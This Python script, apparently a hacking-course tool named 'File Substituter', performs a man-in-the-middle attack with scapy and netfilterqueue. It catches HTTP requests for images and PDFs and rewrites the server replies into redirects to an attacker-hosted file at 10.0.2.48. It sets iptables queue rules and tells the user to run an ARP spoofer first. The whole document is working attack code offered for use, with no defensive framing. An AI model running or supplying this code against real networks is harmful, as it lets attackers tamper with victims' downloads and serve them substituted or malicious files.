
#!/usr/bin/env python
#This Script only works properly in  Python 3.6
import netfilterqueue
import subprocess
import scapy.all as scapy

ack_list = [] #list of acknowledges responses

def process_packet(packet):
	list_extensions = [".jpg",".png",".jpeg",".gif",".pdf"]
	scapy_packet = scapy.IP(packet.get_payload()) #Converting NetFilterPacket into a Scapy Packet
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport==80:
			for extension in list_extensions:
				if extension in str(scapy_packet[scapy.Raw].load) :
					print("[+] Trying to download an image")
					ack_list.append(scapy_packet[scapy.TCP].ack)

		elif scapy_packet[scapy.TCP].sport==80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				print("[+] Replacing File Image")
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.48/Hacked.jpeg\n\n"
				print(scapy_packet.show())
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.TCP].chksum
				byte_packet = bytes(scapy_packet)
				packet.set_payload(byte_packet)

#	print(packet.get_payload())
	packet.accept()

def chain_creation(queue_num):

    subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num "+str(queue_num),shell=True)

def chain_delete():

    subprocess.call("sudo iptables --flush",shell=True)

n=0
print("Welcome to File Substituter. Few steps to consider: ")
print("[+] Use  this Script with Python3.6 if issues are present")
print("[+] Make sure the file you'll use for substituting is available")
print("[+] Use an ARP Spoofer first")
queue_num=8
while n==0:
	try:
		chain_creation(queue_num)
		queue = netfilterqueue.NetfilterQueue()
		queue.bind(queue_num,process_packet)
		queue.run()

	except KeyboardInterrupt:
		print("KeyboardInterrupt pressed")
		chain_delete()
		n=1
	except OSError:
		queue_num= queue_num+1
